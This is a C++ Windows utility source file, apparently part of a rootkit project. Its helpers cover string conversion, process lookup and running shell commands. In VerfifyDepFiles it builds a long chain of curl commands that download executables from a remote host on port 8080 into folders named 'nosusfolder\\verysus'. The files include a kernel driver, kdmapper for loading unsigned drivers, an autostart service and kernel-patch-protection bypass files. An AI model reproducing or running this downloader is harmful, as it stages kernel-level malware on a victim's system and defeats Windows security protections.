#include "utils.h"


int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
    int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
    MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
    return WideNameLen;
}


int WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
    int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
    return MultiByteLen;
}


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


int CountOccurrences(const char* SearchStr, char SearchLetter) {
    DWORD Count = 0;
    for (int i = 0; i < strlen(SearchStr); i++) {
        if (SearchStr[i] == SearchLetter) {
            Count++;
        }
    }
    return Count;
}


int ShowMessage(int Type, const char* Title, const char* Text) {
    return MessageBoxA(NULL, Text, Title, Type);
}


void GetServiceName(char* Path, char* Buffer) {
    char TempBuffer[MAX_PATH] = { 0 };
    int bi = 0;
    int acbi = 0;
    int pi = (int)strlen(Path) - 1;

    for (; pi >= 0; pi--, bi++) {
        if (Path[pi] == '\\') {
            break;
        }
        TempBuffer[bi] = Path[pi];
    }
    TempBuffer[bi] = '\0';
    for (bi = (int)strlen(TempBuffer) - 1; bi >= 0; bi--, acbi++) {
        Buffer[acbi] = TempBuffer[bi];
    }
}


void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
    int ii = 0;
    int repi = 0;
    int comi = 0;

    for (int i = 0; i <= strlen(BaseString); i++) {
        if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
            memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace));
            comi += strlen(RepArr[repi].Replace);

            RepArr[repi].RepCount -= 1;
            if (RepArr[repi].RepCount == 0) {
                repi++;
            }
        }
        else {
            Output[comi] = BaseString[i];
            comi++;
        }
    }
}

DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
    char Command[500] = { 0 };
    ReplaceValues(BaseCommand, RepArr, Command, Size);
    if (system(Command) == -1) {
        return GetLastError();
    }
    return 0;
}


void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    int i = 0;
    for (; i < (int)RandSize; i++) {
        NameBuf[i] = Alp[distr(gen)];
    }
    for (int exti = 0; exti <= strlen(Extension); exti++, i++) {
        NameBuf[i] = Extension[exti];
    }
}


int GetPidByName(const char* Name) {
    int ProcessId = 0;
    DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
    char CurrentName[MAX_PATH] = { 0 };
    HANDLE CurrentProc = INVALID_HANDLE_VALUE;
    HMODULE CurrentProcMod = NULL;

    // Get the list of PIDs of all running processes -   
    if (!EnumProcesses(Procs, sizeof(Procs), &BytesReturned))
        return 0;
    ProcessesNum = BytesReturned / sizeof(DWORD);

    for (int i = 0; i < ProcessesNum; i++) {
        if (Procs[i] != 0) {
            CurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);
            if (CurrentProc != NULL) {
                if (EnumProcessModules(CurrentProc, &CurrentProcMod, sizeof(CurrentProcMod), &BytesReturned)) {
                    GetModuleBaseNameA(CurrentProc, CurrentProcMod, CurrentName, sizeof(CurrentName) / sizeof(TCHAR));
                    if (lstrcmpiA(Name, CurrentName) == 0) {
                        ProcessId = Procs[i];
                        break;
                    }
                }
                CloseHandle(CurrentProc);
            }
        }
    }
    return ProcessId;
}


int VerfifyDepDirs() {
    if (system("if not exist C:\\nosusfolder\\verysus\\KMDFdriver\\Release mkdir C:\\nosusfolder\\verysus\\KMDFdriver\\Release"
        "if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release"
        "if not exist mkdir C:\\nosusfolder\\verysus\\AutoService mkdir mkdir C:\\nosusfolder\\verysus\\AutoService"
        "if not exist mkdir C:\\nosusfolder\\verysus\\meowguard mkdir mkdir C:\\nosusfolder\\verysus\\meowguard") == -1) {
        return GetLastError();
    }
    return 0;
}


int VerfifyDepFiles() {
    if (system("cd C:\\ && "
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && "
        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && "
        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && "
        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && "
        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && "
        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && "
        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && "
        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && "
        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && "
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && "
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && "
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && "
        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && "
        "if not exist nosusfolder\\verysus\\AutoService\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoService\\AutoStart.exe && "
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && "
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && "
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && "
        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe && "
        "if not exist nosusfolder\\verysus\\meowguard\\meow.sys curl http://~:8080/KPP/meow10/bin_meow_x64/meow.sys --output nosusfolder\\verysus\\meowguard\\meow.sys && "
        "if not exist nosusfolder\\verysus\\meowguard\\uninstall.bat curl http://~:8080/KPP/meow10/bin_meow_x64/uninstall.bat --output nosusfolder\\verysus\\meowguard\\uninstall.bat && "
        "if not exist nosusfolder\\verysus\\meowguard\\install.bat curl http://~:8080/KPP/meow10/bin_meow_x64/install.bat --output nosusfolder\\verysus\\meowguard\\install.bat && "
        "if not exist nosusfolder\\verysus\\meowguard\\dbghelp.dll curl http://~:8080/KPP/meow10/bin_meow_x64/dbghelp.dll --output nosusfolder\\verysus\\meowguard\\dbghelp.dll && "
        "if not exist nosusfolder\\verysus\\meowguard\\symsrv.dll curl http://~:8080/KPP/meow10/bin_meow_x64/symsrv.dll --output nosusfolder\\verysus\\meowguard\\symsrv.dll && "
        "if not exist nosusfolder\\verysus\\meowguard\\meow_client.exe curl http://~:8080/KPP/meow10/bin_meow_x64/meow_client.exe --output nosusfolder\\verysus\\meowguard\\meow_client.exe && "
        "if not exist nosusfolder\\verysus\\meowguard\\MeowWrapper.exe curl http://~:8080/KPP/meow10/bin_meow_x64/MeowWrapper/x64/Release/MeowWrapper.exe --output nosusfolder\\verysus\\meowguard\\MeowWrapper.exe") == -1) {
        return GetLastError();
    }
    return 0;
}